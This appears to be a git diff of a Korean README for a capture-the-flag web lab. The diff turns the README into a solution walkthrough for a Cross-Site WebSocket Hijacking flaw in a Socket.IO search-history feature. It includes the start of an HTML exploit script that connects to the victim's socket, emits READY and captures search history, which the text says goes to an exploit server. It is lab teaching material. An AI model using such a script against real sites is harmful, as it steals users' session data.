@@ -1,37 +1,28 @@
-# Cat-Distribution-System
-To adopt kitties ₍^. .^₎⟆
-<br><br>
-
-## 페이지 구성
-- home 페이지에서 입양할 고양이 확인 가능(고양이 클릭하면 세부정보 알 수 있음)
-- 우상단에 Login 클릭 시 로그인 페이지로 연결
-- Search 기능이 있음 (취약점 있는 부분)
-- 전체 Search History를 반환하는 기능 구현
-<br>
+# 문제 풀이 시나리오
 
 ## 1. 검색 기능 분석
 
 - 검색창에 무언가를 검색하면 검색 기록도 반환됨
 - 검색 기록은 세션에 따라 반환됨
-- 개발자 툴을 통해 살펴보면 웹 소켓 핸드셰이크를 찾을 수 있음
-- “순수 WebSocket 프레임”이 아니라 Socket.IO 프레이밍을 사용하는 것 파악
-- 요청에 예측 불가능한 토큰이 없기 때문에 CSWSH 취약점의 가능성
-- 페이지 새로고침 시 클라이언트가 READY 메시지를 서버에 보내고 서버는 검색 기록으로 응답함
-(단순 `new WebSocket(...).send("READY")` 로는 안 됨. Socket.IO 클라이언트를 써서 `socket.emit("READY", …)` 로 보내야 함)
+- 개발자 툴을 통해 살펴보면 웹소켓 통신을 확인하면 Socket.IO 프로토콜을 확인할 수 있
+- CSWSH(Cross-Site WebSocket Hijacking) 취약점 가능성을 발견할 수 있음.
+- 페이지 새로고침 시 클라이언트는 READY 메시지를 서버에 보내고, 서버는 해당 세션의 검색 기록을 반환함.
+- 단순 new WebSocket(...).send("READY")는 동작하지 않음.
+- Socket.IO 클라이언트를 사용해 socket.emit("READY", …) 해야 함.
 
 ## 2. CSWSH 취약점 확인
 
-- search.js에서 코드 확인하고 공격 스크립트 작성해 익스플로잇 서버 통해 보내기
+- 참가자는 search.js 코드를 분석하고 공격 스크립트를 작성함.
+- 공격 스크립트를 익스플로잇 서버에 보내면, Puppeteer가 이를 자동으로 실행했다고 가정함.
+- 즉, 피해자가 실제로 열어보지 않아도, 서버는 공격 스크립트 실행 결과를 victim이 실행한 것처럼 처리함.
     
     ### 2-1. 공격 스크립트 작성
     
-    - 아래와 같이 익스플로잇 코드를 작성하여 익스플로잇 서버에 주입
-    - 웹소켓 주소 알아내기 (F12 -> Network -> Socket: request url)
+    - 웹소켓 주소를 알아내서 READY 메시지를 서버에 보내고 검색 기록을 수집하여 익스플로잇 서버에 전달
         
         ```html
         <script src="http://127.0.0.1:5000/static/js/socket.io.min.js"></script>
         <script>
-        // exploit.js (참가자가 작성)
         const socket = io("http://web:5000"); // Socket.IO 연결
         socket.on('connect', () => socket.emit("READY", {}));
         socket.on('search_history', (data) => {
